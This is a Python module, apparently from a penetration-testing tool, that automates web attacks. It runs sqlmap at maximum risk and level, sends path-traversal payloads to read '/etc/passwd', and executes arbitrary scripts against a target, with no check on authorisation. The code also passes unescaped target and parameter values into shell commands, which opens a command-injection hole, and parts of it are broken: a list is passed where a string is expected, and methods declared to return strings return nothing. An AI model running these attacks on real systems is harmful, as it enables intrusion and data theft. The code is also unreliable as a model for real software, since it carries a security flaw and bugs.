# pentek/core/web_core/web_exploits.py

import os
import subprocess
from core.scanning_core.network import NetworkScan

class WebExploits:
    """
    Automated web‑vulnerability exploitation.
    """
    def __init__(self):
        self.module = "WebExploits"

    def try_sql_injection(self, exp_obj, target: str, param: str) -> str:
        exp_obj.db_handler.initialize_function(target, exp_obj.scan_type, self.module, scan_subtype="SQLmap")
        cmd = f"sqlmap -u \"{target}?{param}=1\" --batch --risk=3 --level=5"
        output = subprocess.getoutput(cmd)
        exp_obj.db_handler.store_scan_result(target, output, scan_subtype="SQLmap")
        print(output)

    def try_lfi(self, exp_obj, target: str, param: str) -> str:
        exp_obj.db_handler.initialize_function(target, exp_obj.scan_type, self.module, scan_subtype="LFI")
        payloads = ["../../etc/passwd", "..%2F..%2Fetc%2Fpasswd"]
        results = []
        for p in payloads:
            res = subprocess.getoutput(f"curl -s \"{target}?{param}={p}\"")
            results.append((p, res))
        output = "\n".join(f"{p}: {'FOUND' if 'root:' in r else 'NOT_FOUND'}" for p, r in results)
        exp_obj.db_handler.store_scan_result(target, output, scan_subtype="LFI")
        print(output)

    def run_custom_script(self, exp_obj, script_path: str, target: str, param: str) -> str:
        exp_obj.db_handler.initialize_function(target, exp_obj.scan_type, self.module, scan_subtype="Script_Run")
        if not os.access(script_path, os.X_OK):
            os.chmod(script_path, 0o755)
        ext = os.path.splitext(script_path)[1]
        cmd = {
            '.py': ['python3', script_path, target, param],
            '.pl': ['perl',    script_path, target, param],
            '.rb': ['ruby',    script_path, target, param]
        }.get(ext, [script_path, target, param])
        output = subprocess.getoutput(cmd)
        exp_obj.db_handler.store_scan_result(target, output, scan_subtype="Script_Run")
        print(output)

    def orchestrate(self, exp_obj, target: str, params: list):
        for p in params:
            print(f"[+] Testing SQLi on {p}")
            self.try_sql_injection(exp_obj, target, p)
        for p in params:
            print(f"[+] Testing LFI on {p}")
            self.try_lfi(exp_obj, target, p)

    @staticmethod
    def run_all(exp_obj, target: str, params: list):
        """
        One‑line: run SQLi and LFI tests for every param.
        """
        WebExploits().orchestrate(exp_obj, target, params)
